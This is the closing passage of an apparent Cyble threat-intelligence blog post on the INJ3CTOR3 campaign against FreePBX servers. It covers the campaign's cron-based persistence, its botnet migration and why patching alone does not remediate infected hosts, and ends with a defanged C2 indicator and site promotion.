The architecture is designed to prevent sequential remediation from succeeding. Clearing five of six channels hands the infection a recovery window measured in minutes. A confirmed infection warrants a full rebuild from a clean baseline.


The self-eviction of prior campaign artifacts is as analytically significant as the new tooling. Hunting down VictamPbx artifacts, cutting off the old C2, and rotating passwords on dormant accounts all point to an intentional botnet migration rather than an incidental cleanup.


Six years of continuous operation, each generation cleanly evicting the last, reflects the discipline that keeps this campaign running through repeated public disclosure.


Both candidate CVEs are patched in current FreePBX releases, but the 700+ hosts Shadowserver tracked as still compromised five months after the CVE-2025-64328 disclosure suggest that patching alone does not equal remediation.


On an already-owned host, patching closes the entry point but leaves the cron infrastructure intact, allowing the infection to re-establish itself before the patch can take effect.


The C2 at 45\[.\]95\[.\]147\[.\]178 remains active. Cyble Research & Intelligence Labs continues to monitor the evolution of INJ3CTOR3’s infrastructure and toolset.


CYBLE.


AI Threat Intelligence


### Stop Executive Threats
Before They Strike


Monitor dark web chatter, detect lookalike domains, and protect your C-suite from targeted impersonation — in real time, across 50+ countries.


[Request a Demo](https://cyble.com/request-demo/)


[Previous Post Cyble Named a Challenger in the Inaugural 2026 Gartner® Magic Quadrant™ for Cyberthreat Intelligence Technologies](https://cyble.com/blog/cyble-challenger-in-2026-gartner-cyberthreat-intelligence-technologies/)[Next Post OverlayPhantom: The Android Banking Trojan Hiding in Plain Sight](https://cyble.com/blog/overlayphantom-android-banking-trojan/)


### More from Cyble


[View all posts](https://cyble.com/blog/)


[Threat Intelligence APTs Top the List of Most Active Threat Actors in H1 2026 Jul 27, 2026 · 4 min read](https://cyble.com/blog/most-active-threat-actors-h1-2026/)[Dark Web Monitoring Inside the Underground Economy: 5 Dark Web Trends Shaping the 2026 Threat Landscape Jul 8, 2026 · 7 min read](https://cyble.com/blog/dark-web-trends-2026-cyber-threat-landscape/)[Cyber news Mid-Year Threat Trends: What H1 2026 Signals for the Rest of the Year Jul 6, 2026 · 6 min read](https://cyble.com/blog/2026-threat-intelligence-trends/)
